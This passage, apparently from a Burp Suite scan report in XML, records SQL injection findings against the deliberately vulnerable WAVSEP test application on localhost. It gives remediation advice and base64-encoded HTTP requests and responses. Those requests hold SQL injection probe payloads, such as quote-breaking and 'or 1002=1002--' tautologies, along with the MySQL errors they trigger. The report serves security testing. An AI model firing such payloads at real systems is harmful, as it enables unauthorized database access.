VJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0KbXNnPXJlYWRtZScmdGFyZ2V0PWElNDBhLmNvbQ==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxlbmd0aDogNzY4DQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUwOjU4IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDEgLSBJbmplY3Rpb24gaW50byBzdHJpbmcgdmFsdWVzIGluIGFuIGluc2VydCAodmFsdWVzKSBzdGF0ZW1lbnQgd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KCjwhLS0KCUluc3BpcmVkIGJ5IGEgdnVsbmVyYWJsZSB0ZXN0IGNhc2Ugb3JpZ2luYWxseSB3cml0dGVuIGZvciB0aGUgT1dBU1AgWmVkIEF0dGFjayBQcm94eSAoWkFQKSBwcm9qZWN0CgkoaHR0cDovL3d3dy5vd2FzcC5vcmcvaW5kZXgucGhwL09XQVNQX1plZF9BdHRhY2tfUHJveHlfUHJvamVjdCkgCglPcmlnaW5hbCBBdXRob3I6IHBzaWlub24gKHBzaWlub25AZ21haWwuY29tKS4KLS0+CgpFeGNlcHRpb24gZGV0YWlsczogamF2YS5zcWwuU1FMU3ludGF4RXJyb3JFeGNlcHRpb246IFlvdSBoYXZlIGFuIGVycm9yIGluIHlvdXIgU1FMIHN5bnRheDsgY2hlY2sgdGhlIG1hbnVhbCB0aGF0IGNvcnJlc3BvbmRzIHRvIHlvdXIgTXlTUUwgc2VydmVyIHZlcnNpb24gZm9yIHRoZSByaWdodCBzeW50YXggdG8gdXNlIG5lYXIgJ2FAYS5jb20nKScgYXQgbGluZSAxCgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci1FeHBlcmltZW50YWwvQ2FzZTAxLUluamVjdGlvbkluSW5zZXJ0VmFsdWVzLVN0cmluZy1CaW5hcnlEZWxpYmVyYXRlUnVudGltZUVycm9yLVdpdGgyMDBFcnJvcnMuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAyNw0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLVBPU1QtMjAwRXJyb3ItRXhwZXJpbWVudGFsL0Nhc2UwMS1JbmplY3Rpb25Jbkluc2VydFZhbHVlcy1TdHJpbmctQmluYXJ5RGVsaWJlcmF0ZVJ1bnRpbWVFcnJvci1XaXRoMjAwRXJyb3JzLmpzcA0KQ29va2llOiBKU0VTU0lPTklEPUU0NEFBNTYzQzRFQkU0MEQ3MjY4OTk2NTVCNjBBQjEwDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0KbXNnPXJlYWRtZScnJnRhcmdldD1hJTQwYS5jb20=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUwOjU4IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1NzQNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDEgLSBJbmplY3Rpb24gaW50byBzdHJpbmcgdmFsdWVzIGluIGFuIGluc2VydCAodmFsdWVzKSBzdGF0ZW1lbnQgd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KCjwhLS0KCUluc3BpcmVkIGJ5IGEgdnVsbmVyYWJsZSB0ZXN0IGNhc2Ugb3JpZ2luYWxseSB3cml0dGVuIGZvciB0aGUgT1dBU1AgWmVkIEF0dGFjayBQcm94eSAoWkFQKSBwcm9qZWN0CgkoaHR0cDovL3d3dy5vd2FzcC5vcmcvaW5kZXgucGhwL09XQVNQX1plZF9BdHRhY2tfUHJveHlfUHJvamVjdCkgCglPcmlnaW5hbCBBdXRob3I6IHBzaWlub24gKHBzaWlub25AZ21haWwuY29tKS4KLS0+CgpRdWVyeSBleGVjdXRlZAoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci1FeHBlcmltZW50YWwvQ2FzZTAxLUluamVjdGlvbkluSW5zZXJ0VmFsdWVzLVN0cmluZy1CaW5hcnlEZWxpYmVyYXRlUnVudGltZUVycm9yLVdpdGgyMDBFcnJvcnMuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAyNw0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLVBPU1QtMjAwRXJyb3ItRXhwZXJpbWVudGFsL0Nhc2UwMS1JbmplY3Rpb25Jbkluc2VydFZhbHVlcy1TdHJpbmctQmluYXJ5RGVsaWJlcmF0ZVJ1bnRpbWVFcnJvci1XaXRoMjAwRXJyb3JzLmpzcA0KQ29va2llOiBKU0VTU0lPTklEPUU0NEFBNTYzQzRFQkU0MEQ3MjY4OTk2NTVCNjBBQjEwDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0KbXNnPXJlYWRtZTc4ODI0MDkyJyUyMG9yJTIwNTA4MCUzZDUwODAtLSUyMCZ0YXJnZXQ9YSU0MGEuY29t]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxlbmd0aDogNzU5DQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUwOjU4IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDEgLSBJbmplY3Rpb24gaW50byBzdHJpbmcgdmFsdWVzIGluIGFuIGluc2VydCAodmFsdWVzKSBzdGF0ZW1lbnQgd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KCjwhLS0KCUluc3BpcmVkIGJ5IGEgdnVsbmVyYWJsZSB0ZXN0IGNhc2Ugb3JpZ2luYWxseSB3cml0dGVuIGZvciB0aGUgT1dBU1AgWmVkIEF0dGFjayBQcm94eSAoWkFQKSBwcm9qZWN0CgkoaHR0cDovL3d3dy5vd2FzcC5vcmcvaW5kZXgucGhwL09XQVNQX1plZF9BdHRhY2tfUHJveHlfUHJvamVjdCkgCglPcmlnaW5hbCBBdXRob3I6IHBzaWlub24gKHBzaWlub25AZ21haWwuY29tKS4KLS0+CgpFeGNlcHRpb24gZGV0YWlsczogamF2YS5zcWwuU1FMU3ludGF4RXJyb3JFeGNlcHRpb246IFlvdSBoYXZlIGFuIGVycm9yIGluIHlvdXIgU1FMIHN5bnRheDsgY2hlY2sgdGhlIG1hbnVhbCB0aGF0IGNvcnJlc3BvbmRzIHRvIHlvdXIgTXlTUUwgc2VydmVyIHZlcnNpb24gZm9yIHRoZSByaWdodCBzeW50YXggdG8gdXNlIG5lYXIgJycgYXQgbGluZSAxCgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>6544650190305434624</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error-Experimental/Case01-InjectionInInsertValues-String-BinaryDeliberateRuntimeError-With200Errors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error-Experimental/Case01-InjectionInInsertValues-String-BinaryDeliberateRuntimeError-With200Errors.jsp [target parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>target</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the target parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>38450225' or 1002=1002-- </b> was submitted in the target parameter, and a database error message was returned. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci1FeHBlcmltZW50YWwvQ2FzZTAxLUluamVjdGlvbkluSW5zZXJ0VmFsdWVzLVN0cmluZy1CaW5hcnlEZWxpYmVyYXRlUnVudGltZUVycm9yLVdpdGgyMDBFcnJvcnMuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAyNw0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLVBPU1QtMjAwRXJyb3ItRXhwZXJpbWVudGFsL0Nhc2UwMS1JbmplY3Rpb25Jbkluc2VydFZhbHVlcy1TdHJpbmctQmluYXJ5RGVsaWJlcmF0ZVJ1bnRpbWVFcnJvci1XaXRoMjAwRXJyb3JzLmpzcA0KQ29va2llOiBKU0VTU0lPTklEPUU0NEFBNTYzQzRFQkU0MEQ3MjY4OTk2NTVCNjBBQjEwDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0KbXNnPXJlYWRtZSZ0YXJnZXQ9YUBhLmNvbSc=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxlbmd0aDogNzcwDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUwOjU4IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDEgLSBJbmplY3Rpb24gaW50byBzdHJpbmcgdmFsdWVzIGluIGFuIGluc2VydCAodmFsdWVzKSBzdGF0ZW1lbnQgd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KCjwhLS0KCUluc3BpcmVkIGJ5IGEgdnVsbmVyYWJsZSB0ZXN0IGNhc2Ugb3JpZ2luYWxseSB3cml0dGVuIGZvciB0aGUgT1dBU1AgWmVkIEF0dGFjayBQcm94eSAoWkFQKSBwcm9qZWN0CgkoaHR0cDovL3d3dy5vd2FzcC5vcmcvaW5kZXgucGhwL09XQVNQX1plZF9BdHRhY2tfUHJveHlfUHJvamVjdCkgCglPcmlnaW5hbCBBdXRob3I6IHBzaWlub24gKHBzaWlub25AZ21haWwuY29tKS4KLS0+CgpFeGNlcHRpb24gZGV0YWlsczogamF2YS5zcWwuU1FMU3ludGF4RXJyb3JFeGNlcHRpb246IFlvdSBoYXZlIGFuIGVycm9yIGluIHlvdXIgU1FMIHN5bnRheDsgY2hlY2sgdGhlIG1hbnVhbCB0aGF0IGNvcnJlc3BvbmRzIHRvIHlvdXIgTXlTUUwgc2VydmVyIHZlcnNpb24gZm9yIHRoZSByaWdodCBzeW50YXggdG8gdXNlIG5lYXIgJydhQGEuY29tJycpJyBhdCBsaW5lIDEKCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci1FeHBlcmltZW50YWwvQ2FzZTAxLUluamVjdGlvbkluSW5zZXJ0VmFsdWVzLVN0cmluZy1CaW5hcnlEZWxpYmVyYXRlUnVudGltZUVycm9yLVdpdGgyMDBFcnJvcnMuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAyNw0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLVBPU1QtMjAwRXJyb3ItRXhwZXJpbWVudGFsL0Nhc2UwMS1JbmplY3Rpb25Jbkluc2VydFZhbHVlcy1TdHJpbmctQmluYXJ5RGVsaWJlcmF0ZVJ1bnRpbWVFcnJvci1XaXRoMjAwRXJyb3JzLmpzcA0KQ29va2llOiBKU0VTU0lPTklEPUU0NEFBNTYzQzRFQkU0MEQ3MjY4OTk2NTVCNjBBQjEwDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0KbXNnPXJlYWRtZSZ0YXJnZXQ9YUBhLmNvbScn]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUwOjU4IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1NzQNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDEgLSBJbmplY3Rpb24gaW50byBzdHJpbmcgdmFsdWVzIGluIGFuIGluc2VydCAodmFsdWVzKSBzdGF0ZW1lbnQgd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KCjwhLS0KCUluc3BpcmVkIGJ5IGEgdnVsbmVyYWJsZSB0ZXN0IGNhc2Ugb3JpZ2luYWxseSB3cml0dGVuIGZvciB0aGUgT1dBU1AgWmVkIEF0dGFjayBQcm94eSAoWkFQKSBwcm9qZWN0CgkoaHR0cDovL3d3dy5vd2FzcC5vcmcvaW5kZXgucGhwL09XQVNQX1plZF9BdHRhY2tfUHJveHlfUHJvamVjdCkgCglPcmlnaW5hbCBBdXRob3I6IHBzaWlub24gKHBzaWlub25AZ21haWwuY29tKS4KLS0+CgpRdWVyeSBleGVjdXRlZAoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci1FeHBlcmltZW50YWwvQ2FzZTAxLUluamVjdGlvbkluSW5zZXJ0VmFsdWVzLVN0cmluZy1CaW5hcnlEZWxpYmVyYXRlUnVudGltZUVycm9yLVdpdGgyMDBFcnJvcnMuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAyNw0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLVBPU1QtMjAwRXJyb3ItRXhwZXJpbWVudGFsL0Nhc2UwMS1JbmplY3Rpb25Jbkluc2VydFZhbHVlcy1TdHJpbmctQmluYXJ5RGVsaWJlcmF0ZVJ1bnRpbWVFcnJvci1XaXRoMjAwRXJyb3JzLmpzcA0KQ29va2llOiBKU0VTU0lPTklEPUU0NEFBNTYzQzRFQkU0MEQ3MjY4OTk2NTVCNjBBQjEwDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0KbXNnPXJlYWRtZSZ0YXJnZXQ9YUBhLmNvbTM4NDUwMjI1JyUyMG9yJTIwMTAwMiUzZDEwMDItLSUyMA==]]></request>
